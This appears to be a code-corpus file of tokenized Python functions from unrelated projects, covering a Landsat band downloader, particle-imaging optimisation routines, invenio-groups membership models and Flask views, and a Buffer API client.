def download ( self , bands , download_dir = None , metadata = False ) : super ( AWSDownloader , self ) . validate_bands ( bands ) if download_dir is None : download_dir = DOWNLOAD_DIR dest_dir = check_create_folder ( join ( download_dir , self . sceneInfo . name ) ) downloaded = [ ] for band in bands : if band == 'BQA' : filename = '%s_%s.%s' % ( self . sceneInfo . name , band , self . __remote_file_ext ) else : filename = '%s_B%s.%s' % ( self . sceneInfo . name , band , self . __remote_file_ext ) band_url = join ( self . base_url , filename ) downloaded . append ( self . fetch ( band_url , dest_dir , filename ) ) if metadata : filename = '%s_MTL.txt' % ( self . sceneInfo . name ) url = join ( self . base_url , filename ) self . fetch ( url , dest_dir , filename ) return downloaded
def writable_path ( path ) : if os . path . exists ( path ) : return os . access ( path , os . W_OK ) try : with open ( path , 'w' ) : pass except ( OSError , IOError ) : return False else : os . remove ( path ) return True
def writable_stream ( handle ) : if isinstance ( handle , io . IOBase ) and sys . version_info >= ( 3 , 5 ) : return handle . writable ( ) try : handle . write ( b'' ) except ( io . UnsupportedOperation , IOError ) : return False else : return True
def _wait_for_connection ( self , port ) : connected = False max_tries = 10 num_tries = 0 wait_time = 0.5 while not connected or num_tries >= max_tries : time . sleep ( wait_time ) try : af = socket . AF_INET addr = ( '127.0.0.1' , port ) sock = socket . socket ( af , socket . SOCK_STREAM ) sock . connect ( addr ) except socket . error : if sock : sock . close ( ) num_tries += 1 continue connected = True if not connected : print ( "Error connecting to sphinx searchd" , file = sys . stderr )
def get_settings_path ( settings_module ) : cwd = os . getcwd ( ) settings_filename = '%s.py' % ( settings_module . split ( '.' ) [ - 1 ] ) while cwd : if settings_filename in os . listdir ( cwd ) : break cwd = os . path . split ( cwd ) [ 0 ] if os . name == 'nt' and NT_ROOT . match ( cwd ) : return None elif cwd == '/' : return None return cwd
def finalize ( self , result = None ) : if not self . settings_path : # short circuit if no settings file can be found return from django . test . utils import teardown_test_environment from django . db import connection from django . conf import settings self . call_plugins_method ( 'beforeDestroyTestDb' , settings , connection ) try : connection . creation . destroy_test_db ( self . old_db , verbosity = self . verbosity , ) except Exception : # If we can't tear down the test DB, don't worry about it. pass self . call_plugins_method ( 'afterDestroyTestDb' , settings , connection ) self . call_plugins_method ( 'beforeTeardownTestEnv' , settings , teardown_test_environment ) teardown_test_environment ( ) self . call_plugins_method ( 'afterTeardownTestEnv' , settings )
def update_field ( self , poses = None ) : m = np . clip ( self . particle_field , 0 , 1 ) part_color = np . zeros ( self . _image . shape ) for a in range ( 4 ) : part_color [ : , : , : , a ] = self . part_col [ a ] self . field = np . zeros ( self . _image . shape ) for a in range ( 4 ) : self . field [ : , : , : , a ] = m * part_color [ : , : , : , a ] + ( 1 - m ) * self . _image [ : , : , : , a ]
def _remove_closest_particle ( self , p ) : #1. find closest pos: dp = self . pos - p dist2 = ( dp * dp ) . sum ( axis = 1 ) ind = dist2 . argmin ( ) rp = self . pos [ ind ] . copy ( ) #2. delete self . pos = np . delete ( self . pos , ind , axis = 0 ) return rp
def diffusion ( diffusion_constant = 0.2 , exposure_time = 0.05 , samples = 200 ) : radius = 5 psfsize = np . array ( [ 2.0 , 1.0 , 3.0 ] ) # create a base image of one particle s0 = init . create_single_particle_state ( imsize = 4 * radius , radius = radius , psfargs = { 'params' : psfsize , 'error' : 1e-6 } ) # add up a bunch of trajectories finalimage = 0 * s0 . get_model_image ( ) [ s0 . inner ] position = 0 * s0 . obj . pos [ 0 ] for i in xrange ( samples ) : offset = np . sqrt ( 6 * diffusion_constant * exposure_time ) * np . random . randn ( 3 ) s0 . obj . pos [ 0 ] = np . array ( s0 . image . shape ) / 2 + offset s0 . reset ( ) finalimage += s0 . get_model_image ( ) [ s0 . inner ] position += s0 . obj . pos [ 0 ] finalimage /= float ( samples ) position /= float ( samples ) # place that into a new image at the expected parameters s = init . create_single_particle_state ( imsize = 4 * radius , sigma = 0.05 , radius = radius , psfargs = { 'params' : psfsize , 'error' : 1e-6 } ) s . reset ( ) # measure the true inferred parameters return s , finalimage , position
def tile_overlap ( inner , outer , norm = False ) : div = 1.0 / inner . volume if norm else 1.0 return div * ( inner . volume - util . Tile . intersection ( inner , outer ) . volume )
def translate_fourier ( image , dx ) : N = image . shape [ 0 ] f = 2 * np . pi * np . fft . fftfreq ( N ) kx , ky , kz = np . meshgrid ( * ( f , ) * 3 , indexing = 'ij' ) kv = np . array ( [ kx , ky , kz ] ) . T q = np . fft . fftn ( image ) * np . exp ( - 1.j * ( kv * dx ) . sum ( axis = - 1 ) ) . T return np . real ( np . fft . ifftn ( q ) )
def users ( ) : from invenio_groups . models import Group , Membership , PrivacyPolicy , SubscriptionPolicy admin = accounts . datastore . create_user ( email = 'admin@inveniosoftware.org' , password = encrypt_password ( '123456' ) , active = True , ) reader = accounts . datastore . create_user ( email = 'reader@inveniosoftware.org' , password = encrypt_password ( '123456' ) , active = True , ) admins = Group . create ( name = 'admins' , admins = [ admin ] ) for i in range ( 10 ) : Group . create ( name = 'group-{0}' . format ( i ) , admins = [ admin ] ) Membership . create ( admins , reader ) db . session . commit ( )
def _weight ( self , rsq , sigma = None ) : sigma = sigma or self . filter_size if not self . clip : o = np . exp ( - rsq / ( 2 * sigma ** 2 ) ) else : o = np . zeros ( rsq . shape , dtype = 'float' ) m = ( rsq < self . clipsize ** 2 ) o [ m ] = np . exp ( - rsq [ m ] / ( 2 * sigma ** 2 ) ) return o
def _eval_firstorder ( self , rvecs , data , sigma ) : if not self . blocksize : dist_between_points = self . _distance_matrix ( rvecs , self . x ) gaussian_weights = self . _weight ( dist_between_points , sigma = sigma ) return gaussian_weights . dot ( data ) / gaussian_weights . sum ( axis = 1 ) else : # Now rather than calculating the distance matrix all at once, # we do it in chunks over rvecs ans = np . zeros ( rvecs . shape [ 0 ] , dtype = 'float' ) bs = self . blocksize for a in range ( 0 , rvecs . shape [ 0 ] , bs ) : dist = self . _distance_matrix ( rvecs [ a : a + bs ] , self . x ) weights = self . _weight ( dist , sigma = sigma ) ans [ a : a + bs ] += weights . dot ( data ) / weights . sum ( axis = 1 ) return ans
def _newcall ( self , rvecs ) : # 1. Initial guess for output: sigma = 1 * self . filter_size out = self . _eval_firstorder ( rvecs , self . d , sigma ) # 2. There are differences between 0th order at the points and #    the passed data, so we iterate to remove: ondata = self . _eval_firstorder ( self . x , self . d , sigma ) for i in range ( self . iterations ) : out += self . _eval_firstorder ( rvecs , self . d - ondata , sigma ) ondata += self . _eval_firstorder ( self . x , self . d - ondata , sigma ) sigma *= self . damp return out
def _distance_matrix ( self , a , b ) : def sq ( x ) : return ( x * x ) # matrix = np.sum(map(lambda a,b: sq(a[:,None] - b[None,:]), a.T, #   b.T), axis=0) # A faster version than above: matrix = sq ( a [ : , 0 ] [ : , None ] - b [ : , 0 ] [ None , : ] ) for x , y in zip ( a . T [ 1 : ] , b . T [ 1 : ] ) : matrix += sq ( x [ : , None ] - y [ None , : ] ) return matrix
def _c2x ( self , c ) : return 0.5 * ( self . window [ 0 ] + self . window [ 1 ] + c * ( self . window [ 1 ] - self . window [ 0 ] ) )
def resolve_admin_type ( admin ) : if admin is current_user or isinstance ( admin , UserMixin ) : return 'User' else : return admin . __class__ . __name__
def validate ( cls , policy ) : return policy in [ cls . OPEN , cls . APPROVAL , cls . CLOSED ]
def validate ( cls , policy ) : return policy in [ cls . PUBLIC , cls . MEMBERS , cls . ADMINS ]
def validate ( cls , state ) : return state in [ cls . ACTIVE , cls . PENDING_ADMIN , cls . PENDING_USER ]
def delete ( self ) : with db . session . begin_nested ( ) : Membership . query_by_group ( self ) . delete ( ) GroupAdmin . query_by_group ( self ) . delete ( ) GroupAdmin . query_by_admin ( self ) . delete ( ) db . session . delete ( self )
def _filter ( cls , query , state = MembershipState . ACTIVE , eager = None ) : query = query . filter_by ( state = state ) eager = eager or [ ] for field in eager : query = query . options ( joinedload ( field ) ) return query
def query_by_user ( cls , user , * * kwargs ) : return cls . _filter ( cls . query . filter_by ( user_id = user . get_id ( ) ) , * * kwargs )
def query_invitations ( cls , user , eager = False ) : if eager : eager = [ Membership . group ] return cls . query_by_user ( user , state = MembershipState . PENDING_USER , eager = eager )
def query_requests ( cls , admin , eager = False ) : # Get direct pending request if hasattr ( admin , 'is_superadmin' ) and admin . is_superadmin : q1 = GroupAdmin . query . with_entities ( GroupAdmin . group_id ) else : q1 = GroupAdmin . query_by_admin ( admin ) . with_entities ( GroupAdmin . group_id ) q2 = Membership . query . filter ( Membership . state == MembershipState . PENDING_ADMIN , Membership . id_group . in_ ( q1 ) , ) # Get request from admin groups your are member of q3 = Membership . query_by_user ( user = admin , state = MembershipState . ACTIVE ) . with_entities ( Membership . id_group ) q4 = GroupAdmin . query . filter ( GroupAdmin . admin_type == 'Group' , GroupAdmin . admin_id . in_ ( q3 ) ) . with_entities ( GroupAdmin . group_id ) q5 = Membership . query . filter ( Membership . state == MembershipState . PENDING_ADMIN , Membership . id_group . in_ ( q4 ) ) query = q2 . union ( q5 ) return query
def query_by_group ( cls , group_or_id , with_invitations = False , * * kwargs ) : if isinstance ( group_or_id , Group ) : id_group = group_or_id . id else : id_group = group_or_id if not with_invitations : return cls . _filter ( cls . query . filter_by ( id_group = id_group ) , * * kwargs ) else : return cls . query . filter ( Membership . id_group == id_group , db . or_ ( Membership . state == MembershipState . PENDING_USER , Membership . state == MembershipState . ACTIVE ) )
def create ( cls , group , user , state = MembershipState . ACTIVE ) : with db . session . begin_nested ( ) : membership = cls ( user_id = user . get_id ( ) , id_group = group . id , state = state , ) db . session . add ( membership ) return membership
def get ( cls , group , admin ) : try : ga = cls . query . filter_by ( group = group , admin_id = admin . get_id ( ) , admin_type = resolve_admin_type ( admin ) ) . one ( ) return ga except Exception : return None
def query_by_admin ( cls , admin ) : return cls . query . filter_by ( admin_type = resolve_admin_type ( admin ) , admin_id = admin . get_id ( ) )
def query_admins_by_group_ids ( cls , groups_ids = None ) : assert groups_ids is None or isinstance ( groups_ids , list ) query = db . session . query ( Group . id , func . count ( GroupAdmin . id ) ) . join ( GroupAdmin ) . group_by ( Group . id ) if groups_ids : query = query . filter ( Group . id . in_ ( groups_ids ) ) return query
def all ( self ) : response = self . api . get ( url = PATHS [ 'GET_PROFILES' ] ) for raw_profile in response : self . append ( Profile ( self . api , raw_profile ) ) return self
def _skew ( self , x , z , d = 0 ) : # get the top bound determined by the kurtosis kval = ( np . tanh ( self . _poly ( z , self . _kurtosis_coeffs ( d ) ) ) + 1 ) / 12. bdpoly = np . array ( [ - 1.142468e+04 , 3.0939485e+03 , - 2.0283568e+02 , - 2.1047846e+01 , 3.79808487e+00 , 1.19679781e-02 ] ) top = np . polyval ( bdpoly , kval ) # limit the skewval to be 0 -> top val skew = self . _poly ( z , self . _skew_coeffs ( d ) ) skewval = top * ( np . tanh ( skew ) + 1 ) - top return skewval * ( 3 * x - x ** 3 )
def _kurtosis ( self , x , z , d = 0 ) : val = self . _poly ( z , self . _kurtosis_coeffs ( d ) ) return ( np . tanh ( val ) + 1 ) / 12. * ( 3 - 6 * x ** 2 + x ** 4 )
def edit ( self , text , media = None , utc = None , now = None ) : url = PATHS [ 'EDIT' ] % self . id post_data = "text=%s&" % text if now : post_data += "now=%s&" % now if utc : post_data += "utc=%s&" % utc if media : media_format = "media[%s]=%s&" for media_type , media_item in media . iteritems ( ) : post_data += media_format % ( media_type , media_item ) response = self . api . post ( url = url , data = post_data ) return Update ( api = self . api , raw_response = response [ 'update' ] )
def delete ( self ) : url = PATHS [ 'DELETE' ] % self . id return self . api . post ( url = url )
def new ( self , text , shorten = None , now = None , top = None , media = None , when = None ) : url = PATHS [ 'CREATE' ] post_data = "text=%s&" % text post_data += "profile_ids[]=%s&" % self . profile_id if shorten : post_data += "shorten=%s&" % shorten if now : post_data += "now=%s&" % now if top : post_data += "top=%s&" % top if when : post_data += "scheduled_at=%s&" % str ( when ) if media : media_format = "media[%s]=%s&" for media_type , media_item in media . iteritems ( ) : post_data += media_format % ( media_type , media_item ) response = self . api . post ( url = url , data = post_data ) new_update = Update ( api = self . api , raw_response = response [ 'updates' ] [ 0 ] ) self . append ( new_update ) return new_update
def noformat ( self ) : try : formats = { } for h in self . get_handlers ( ) : formats [ h ] = h . formatter self . set_formatter ( formatter = 'quiet' ) yield except Exception as e : raise finally : for k , v in iteritems ( formats ) : k . formatter = v
def generate_sphere ( radius ) : rint = np . ceil ( radius ) . astype ( 'int' ) t = np . arange ( - rint , rint + 1 , 1 ) x , y , z = np . meshgrid ( t , t , t , indexing = 'ij' ) r = np . sqrt ( x * x + y * y + z * z ) sphere = r < radius return sphere
def sphere_triangle_cdf ( dr , a , alpha ) : p0 = ( dr + alpha ) ** 2 / ( 2 * alpha ** 2 ) * ( 0 > dr ) * ( dr > - alpha ) p1 = 1 * ( dr > 0 ) - ( alpha - dr ) ** 2 / ( 2 * alpha ** 2 ) * ( 0 < dr ) * ( dr < alpha ) return ( 1 - np . clip ( p0 + p1 , 0 , 1 ) )
def _tile ( self , n ) : pos = self . _trans ( self . pos [ n ] ) return Tile ( pos , pos ) . pad ( self . support_pad )
def _i2p ( self , ind , coord ) : return '-' . join ( [ self . param_prefix , str ( ind ) , coord ] )
def get_update_tile ( self , params , values ) : doglobal , particles = self . _update_type ( params ) if doglobal : return self . shape . copy ( ) # 1) store the current parameters of interest values0 = self . get_values ( params ) # 2) calculate the current tileset tiles0 = [ self . _tile ( n ) for n in particles ] # 3) update to newer parameters and calculate tileset self . set_values ( params , values ) tiles1 = [ self . _tile ( n ) for n in particles ] # 4) revert parameters & return union of all tiles self . set_values ( params , values0 ) return Tile . boundingtile ( tiles0 + tiles1 )
def update ( self , params , values ) : #1. Figure out if we're going to do a global update, in which #   case we just draw from scratch. global_update , particles = self . _update_type ( params ) # if we are doing a global update, everything must change, so # starting fresh will be faster instead of add subtract if global_update : self . set_values ( params , values ) self . initialize ( ) return # otherwise, update individual particles. delete the current versions # of the particles update the particles, and redraw them anew at the # places given by (params, values) oldargs = self . _drawargs ( ) for n in particles : self . _draw_particle ( self . pos [ n ] , * listify ( oldargs [ n ] ) , sign = - 1 ) self . set_values ( params , values ) newargs = self . _drawargs ( ) for n in particles : self . _draw_particle ( self . pos [ n ] , * listify ( newargs [ n ] ) , sign = + 1 )
def param_particle ( self , ind ) : ind = self . _vps ( listify ( ind ) ) return [ self . _i2p ( i , j ) for i in ind for j in [ 'z' , 'y' , 'x' , 'a' ] ]
def param_particle_pos ( self , ind ) : ind = self . _vps ( listify ( ind ) ) return [ self . _i2p ( i , j ) for i in ind for j in [ 'z' , 'y' , 'x' ] ]
def param_particle_rad ( self , ind ) : ind = self . _vps ( listify ( ind ) ) return [ self . _i2p ( i , 'a' ) for i in ind ]
def _update_type ( self , params ) : dozscale = False particles = [ ] for p in listify ( params ) : typ , ind = self . _p2i ( p ) particles . append ( ind ) dozscale = dozscale or typ == 'zscale' particles = set ( particles ) return dozscale , particles
def _tile ( self , n ) : zsc = np . array ( [ 1.0 / self . zscale , 1 , 1 ] ) pos , rad = self . pos [ n ] , self . rad [ n ] pos = self . _trans ( pos ) return Tile ( pos - zsc * rad , pos + zsc * rad ) . pad ( self . support_pad )
def j2 ( x ) : to_return = 2. / ( x + 1e-15 ) * j1 ( x ) - j0 ( x ) to_return [ x == 0 ] = 0 return to_return
def calc_pts_hg ( npts = 20 ) : pts_hg , wts_hg = np . polynomial . hermite . hermgauss ( npts * 2 ) pts_hg = pts_hg [ npts : ] wts_hg = wts_hg [ npts : ] * np . exp ( pts_hg * pts_hg ) return pts_hg , wts_hg
def oslicer ( self , tile ) : mask = None vecs = tile . coords ( form = 'meshed' ) for v in vecs : v [ self . slicer ] = - 1 mask = mask & ( v > 0 ) if mask is not None else ( v > 0 ) return tuple ( np . array ( i ) . astype ( 'int' ) for i in zip ( * [ v [ mask ] for v in vecs ] ) )
def filtered_image ( self , im ) : q = np . fft . fftn ( im ) for k , v in self . filters : q [ k ] -= v return np . real ( np . fft . ifftn ( q ) )
def load_image ( self ) : try : image = initializers . load_tiff ( self . filename ) image = initializers . normalize ( image , invert = self . invert , scale = self . exposure , dtype = self . float_precision ) except IOError as e : log . error ( "Could not find image '%s'" % self . filename ) raise e return image
def _draw ( self ) : if self . display : print ( self . _formatstr . format ( * * self . __dict__ ) , end = '' ) sys . stdout . flush ( )
def init_app ( self , app ) : self . init_config ( app ) app . register_blueprint ( blueprint ) app . extensions [ 'invenio-groups' ] = self
def lbl ( axis , label , size = 22 ) : at = AnchoredText ( label , loc = 2 , prop = dict ( size = size ) , frameon = True ) at . patch . set_boxstyle ( "round,pad=0.,rounding_size=0.0" ) #bb = axis.get_yaxis_transform() #at = AnchoredText(label, #        loc=3, prop=dict(size=18), frameon=True, #        bbox_to_anchor=(-0.5,1),#(-.255, 0.90), #        bbox_transform=bb,#axis.transAxes #    ) axis . add_artist ( at )
def sim_crb_diff ( std0 , std1 , N = 10000 ) : a = std0 * np . random . randn ( N , len ( std0 ) ) b = std1 * np . random . randn ( N , len ( std1 ) ) return a - b
def twoslice ( field , center = None , size = 6.0 , cmap = 'bone_r' , vmin = 0 , vmax = 1 , orientation = 'vertical' , figpad = 1.09 , off = 0.01 ) : center = center or [ i // 2 for i in field . shape ] slices = [ ] for i , c in enumerate ( center ) : blank = [ np . s_ [ : ] ] * len ( center ) blank [ i ] = c slices . append ( tuple ( blank ) ) z , y , x = [ float ( i ) for i in field . shape ] w = float ( x + z ) h = float ( y + z ) def show ( field , ax , slicer , transpose = False ) : tmp = field [ slicer ] if not transpose else field [ slicer ] . T ax . imshow ( tmp , cmap = cmap , interpolation = 'nearest' , vmin = vmin , vmax = vmax ) ax . set_xticks ( [ ] ) ax . set_yticks ( [ ] ) ax . grid ( 'off' ) if orientation . startswith ( 'v' ) : # rect = l,b,w,h log . info ( '{} {} {} {} {} {}' . format ( x , y , z , w , h , x / h ) ) r = x / h q = y / h f = 1 / ( 1 + 3 * off ) fig = pl . figure ( figsize = ( size * r , size * f ) ) ax1 = fig . add_axes ( ( off , f * ( 1 - q ) + 2 * off , f , f * q ) ) ax2 = fig . add_axes ( ( off , off , f , f * ( 1 - q ) ) ) show ( field , ax1 , slices [ 0 ] ) show ( field , ax2 , slices [ 1 ] ) else : # rect = l,b,w,h r = y / w q = x / w f = 1 / ( 1 + 3 * off ) fig = pl . figure ( figsize = ( size * f , size * r ) ) ax1 = fig . add_axes ( ( off , off , f * q , f ) ) ax2 = fig . add_axes ( ( 2 * off + f * q , off , f * ( 1 - q ) , f ) ) show ( field , ax1 , slices [ 0 ] ) show ( field , ax2 , slices [ 2 ] , transpose = True ) return fig , ax1 , ax2
def missing_particle ( separation = 0.0 , radius = RADIUS , SNR = 20 ) : # create a base image of one particle s = init . create_two_particle_state ( imsize = 6 * radius + 4 , axis = 'x' , sigma = 1.0 / SNR , delta = separation , radius = radius , stateargs = { 'varyn' : True } , psfargs = { 'error' : 1e-6 } ) s . obj . typ [ 1 ] = 0. s . reset ( ) return s , s . obj . pos . copy ( )
def _check_groups ( s , groups ) : ans = [ ] for g in groups : ans . extend ( g ) if np . unique ( ans ) . size != np . size ( ans ) : return False elif np . unique ( ans ) . size != s . obj_get_positions ( ) . shape [ 0 ] : return False else : return ( np . arange ( s . obj_get_radii ( ) . size ) == np . sort ( ans ) ) . all ( )
def find_best_step ( err_vals ) : if np . all ( np . isnan ( err_vals ) ) : raise ValueError ( 'All err_vals are nans!' ) return np . nanargmin ( err_vals )
def reset ( self , new_damping = None ) : self . _num_iter = 0 self . _inner_run_counter = 0 self . _J_update_counter = self . update_J_frequency self . _fresh_JTJ = False self . _has_run = False if new_damping is not None : self . damping = np . array ( new_damping ) . astype ( 'float' ) self . _set_err_paramvals ( )
def check_completion ( self ) : terminate = False term_dict = self . get_termination_stats ( get_cos = self . costol is not None ) terminate |= np . all ( np . abs ( term_dict [ 'delta_vals' ] ) < self . paramtol ) terminate |= ( term_dict [ 'delta_err' ] < self . errtol ) terminate |= ( term_dict [ 'exp_err' ] < self . exptol ) terminate |= ( term_dict [ 'frac_err' ] < self . fractol ) if self . costol is not None : terminate |= ( curcos < term_dict [ 'model_cosine' ] ) return terminate
def update_J ( self ) : self . calc_J ( ) # np.dot(j, j.T) is slightly faster but 2x as much mem step = np . ceil ( 1e-2 * self . J . shape [ 1 ] ) . astype ( 'int' ) # 1% more mem... self . JTJ = low_mem_sq ( self . J , step = step ) #copies still, since J is not C -ordered but a slice of j_e... #doing self.J.copy() works but takes 2x as much ram.. self . _fresh_JTJ = True self . _J_update_counter = 0 if np . any ( np . isnan ( self . JTJ ) ) : raise FloatingPointError ( 'J, JTJ have nans.' ) #Update self._exp_err self . _exp_err = self . error - self . find_expected_error ( delta_params = 'perfect' )
def calc_grad ( self ) : residuals = self . calc_residuals ( ) return 2 * np . dot ( self . J , residuals )
def update_Broyden_J ( self ) : CLOG . debug ( 'Broyden update.' ) delta_vals = self . param_vals - self . _last_vals delta_residuals = self . calc_residuals ( ) - self . _last_residuals nrm = np . sqrt ( np . dot ( delta_vals , delta_vals ) ) direction = delta_vals / nrm vals = delta_residuals / nrm self . _rank_1_J_update ( direction , vals ) self . JTJ = np . dot ( self . J , self . J . T )
def update_eig_J ( self ) : CLOG . debug ( 'Eigen update.' ) vls , vcs = np . linalg . eigh ( self . JTJ ) res0 = self . calc_residuals ( ) for a in range ( min ( [ self . num_eig_dirs , vls . size ] ) ) : #1. Finding stiff directions stif_dir = vcs [ - ( a + 1 ) ] #already normalized #2. Evaluating derivative along that direction, we'll use dl=5e-4: dl = self . eig_dl #1e-5 _ = self . update_function ( self . param_vals + dl * stif_dir ) res1 = self . calc_residuals ( ) #3. Updating grad_stif = ( res1 - res0 ) / dl self . _rank_1_J_update ( stif_dir , grad_stif ) self . JTJ = np . dot ( self . J , self . J . T ) #Putting the parameters back: _ = self . update_function ( self . param_vals )
def calc_J ( self ) : del self . J self . J = np . zeros ( [ self . param_vals . size , self . data . size ] ) dp = np . zeros_like ( self . param_vals ) f0 = self . model . copy ( ) for a in range ( self . param_vals . size ) : dp *= 0 dp [ a ] = self . dl [ a ] f1 = self . func ( self . param_vals + dp , * self . func_args , * * self . func_kwargs ) grad_func = ( f1 - f0 ) / dp [ a ] #J = grad(residuals) = -grad(model) self . J [ a ] = - grad_func
def update_function ( self , param_vals ) : self . model = self . func ( param_vals , * self . func_args , * * self . func_kwargs ) d = self . calc_residuals ( ) return np . dot ( d . flat , d . flat )
def update_function ( self , param_vals ) : self . opt_obj . update_function ( param_vals ) return self . opt_obj . get_error ( )
def calc_J ( self ) : r0 = self . state . residuals . copy ( ) . ravel ( ) dl = np . zeros ( self . param_vals . size ) p0 = self . param_vals . copy ( ) J = [ ] for a in range ( self . param_vals . size ) : dl *= 0 dl [ a ] += self . dl self . update_function ( p0 + dl ) r1 = self . state . residuals . copy ( ) . ravel ( ) J . append ( ( r1 - r0 ) / self . dl ) self . update_function ( p0 ) return np . array ( J )
def calc_grad ( self ) : if self . _fresh_JTJ : return self . _graderr else : residuals = self . calc_residuals ( ) return 2 * np . dot ( self . J , residuals )
def _do_run ( self , mode = '1' ) : for a in range ( len ( self . particle_groups ) ) : group = self . particle_groups [ a ] lp = LMParticles ( self . state , group , * * self . _kwargs ) if mode == 'internal' : lp . J , lp . JTJ , lp . _dif_tile = self . _load_j_diftile ( a ) if mode == '1' : lp . do_run_1 ( ) if mode == '2' : lp . do_run_2 ( ) if mode == 'internal' : lp . do_internal_run ( ) self . stats . append ( lp . get_termination_stats ( get_cos = self . get_cos ) ) if self . save_J and ( mode != 'internal' ) : self . _dump_j_diftile ( a , lp . J , lp . _dif_tile ) self . _has_saved_J [ a ] = True
def do_internal_run ( self ) : if not self . save_J : raise RuntimeError ( 'self.save_J=True required for do_internal_run()' ) if not np . all ( self . _has_saved_J ) : raise RuntimeError ( 'J, JTJ have not been pre-computed. Call do_run_1 or do_run_2' ) self . _do_run ( mode = 'internal' )
def reset ( self , * * kwargs ) : self . aug_state . reset ( ) super ( LMAugmentedState , self ) . reset ( * * kwargs )
def model_to_data ( self , sigma = 0.0 ) : im = self . model . copy ( ) im += sigma * np . random . randn ( * im . shape ) self . set_image ( util . NullImage ( image = im ) )
def get ( self , name ) : for c in self . comps : if c . category == name : return c return None
def _calc_loglikelihood ( self , model = None , tile = None ) : if model is None : res = self . residuals else : res = model - self . _data [ tile . slicer ] sig , isig = self . sigma , 1.0 / self . sigma nlogs = - np . log ( np . sqrt ( 2 * np . pi ) * sig ) * res . size return - 0.5 * isig * isig * np . dot ( res . flat , res . flat ) + nlogs
def trigger_update ( self , params , values ) : if self . _parent : self . _parent . trigger_update ( params , values ) else : self . update ( params , values )
def get ( self ) : fields = [ c . get ( ) for c in self . comps ] return self . field_reduce_func ( fields )
def set_shape ( self , shape , inner ) : for c in self . comps : c . set_shape ( shape , inner )
def sync_params ( self ) : def _normalize ( comps , param ) : vals = [ c . get_values ( param ) for c in comps ] diff = any ( [ vals [ i ] != vals [ i + 1 ] for i in range ( len ( vals ) - 1 ) ] ) if diff : for c in comps : c . set_values ( param , vals [ 0 ] ) for param , comps in iteritems ( self . lmap ) : if isinstance ( comps , list ) and len ( comps ) > 1 : _normalize ( comps , param )
def read_environment ( ) : out = { } for k , v in iteritems ( os . environ ) : if transform ( k ) in default_conf : out [ transform ( k ) ] = v return out
def get_group_name ( id_group ) : group = Group . query . get ( id_group ) if group is not None : return group . name
def index ( ) : page = request . args . get ( 'page' , 1 , type = int ) per_page = request . args . get ( 'per_page' , 5 , type = int ) q = request . args . get ( 'q' , '' ) groups = Group . query_by_user ( current_user , eager = True ) if q : groups = Group . search ( groups , q ) groups = groups . paginate ( page , per_page = per_page ) requests = Membership . query_requests ( current_user ) . count ( ) invitations = Membership . query_invitations ( current_user ) . count ( ) return render_template ( 'invenio_groups/index.html' , groups = groups , requests = requests , invitations = invitations , page = page , per_page = per_page , q = q )
def requests ( ) : page = request . args . get ( 'page' , 1 , type = int ) per_page = request . args . get ( 'per_page' , 5 , type = int ) memberships = Membership . query_requests ( current_user , eager = True ) . all ( ) return render_template ( 'invenio_groups/pending.html' , memberships = memberships , requests = True , page = page , per_page = per_page , )
def invitations ( ) : page = request . args . get ( 'page' , 1 , type = int ) per_page = request . args . get ( 'per_page' , 5 , type = int ) memberships = Membership . query_invitations ( current_user , eager = True ) . all ( ) return render_template ( 'invenio_groups/pending.html' , memberships = memberships , page = page , per_page = per_page , )
def new ( ) : form = GroupForm ( request . form ) if form . validate_on_submit ( ) : try : group = Group . create ( admins = [ current_user ] , * * form . data ) flash ( _ ( 'Group "%(name)s" created' , name = group . name ) , 'success' ) return redirect ( url_for ( ".index" ) ) except IntegrityError : flash ( _ ( 'Group creation failure' ) , 'error' ) return render_template ( "invenio_groups/new.html" , form = form , )
def manage ( group_id ) : group = Group . query . get_or_404 ( group_id ) form = GroupForm ( request . form , obj = group ) if form . validate_on_submit ( ) : if group . can_edit ( current_user ) : try : group . update ( * * form . data ) flash ( _ ( 'Group "%(name)s" was updated' , name = group . name ) , 'success' ) except Exception as e : flash ( str ( e ) , 'error' ) return render_template ( "invenio_groups/new.html" , form = form , group = group , ) else : flash ( _ ( 'You cannot edit group %(group_name)s' , group_name = group . name ) , 'error' ) return render_template ( "invenio_groups/new.html" , form = form , group = group , )
def members ( group_id ) : page = request . args . get ( 'page' , 1 , type = int ) per_page = request . args . get ( 'per_page' , 5 , type = int ) q = request . args . get ( 'q' , '' ) s = request . args . get ( 's' , '' ) group = Group . query . get_or_404 ( group_id ) if group . can_see_members ( current_user ) : members = Membership . query_by_group ( group_id , with_invitations = True ) if q : members = Membership . search ( members , q ) if s : members = Membership . order ( members , Membership . state , s ) members = members . paginate ( page , per_page = per_page ) return render_template ( "invenio_groups/members.html" , group = group , members = members , page = page , per_page = per_page , q = q , s = s , ) flash ( _ ( 'You are not allowed to see members of this group %(group_name)s.' , group_name = group . name ) , 'error' ) return redirect ( url_for ( '.index' ) )
def approve ( group_id , user_id ) : membership = Membership . query . get_or_404 ( ( user_id , group_id ) ) group = membership . group if group . can_edit ( current_user ) : try : membership . accept ( ) except Exception as e : flash ( str ( e ) , 'error' ) return redirect ( url_for ( '.requests' , group_id = membership . group . id ) ) flash ( _ ( '%(user)s accepted to %(name)s group.' , user = membership . user . email , name = membership . group . name ) , 'success' ) return redirect ( url_for ( '.requests' , group_id = membership . group . id ) ) flash ( _ ( 'You cannot approve memberships for the group %(group_name)s' , group_name = group . name ) , 'error' ) return redirect ( url_for ( '.index' ) )
def remove ( group_id , user_id ) : group = Group . query . get_or_404 ( group_id ) user = User . query . get_or_404 ( user_id ) if group . can_edit ( current_user ) : try : group . remove_member ( user ) except Exception as e : flash ( str ( e ) , "error" ) return redirect ( urlparse ( request . referrer ) . path ) flash ( _ ( 'User %(user_email)s was removed from %(group_name)s group.' , user_email = user . email , group_name = group . name ) , 'success' ) return redirect ( urlparse ( request . referrer ) . path ) flash ( _ ( 'You cannot delete users of the group %(group_name)s' , group_name = group . name ) , 'error' ) return redirect ( url_for ( '.index' ) )
def accept ( group_id ) : membership = Membership . query . get_or_404 ( ( current_user . get_id ( ) , group_id ) ) # no permission check, because they are checked during Memberships creating try : membership . accept ( ) except Exception as e : flash ( str ( e ) , 'error' ) return redirect ( url_for ( '.invitations' , group_id = membership . group . id ) ) flash ( _ ( 'You are now part of %(name)s group.' , user = membership . user . email , name = membership . group . name ) , 'success' ) return redirect ( url_for ( '.invitations' , group_id = membership . group . id ) )
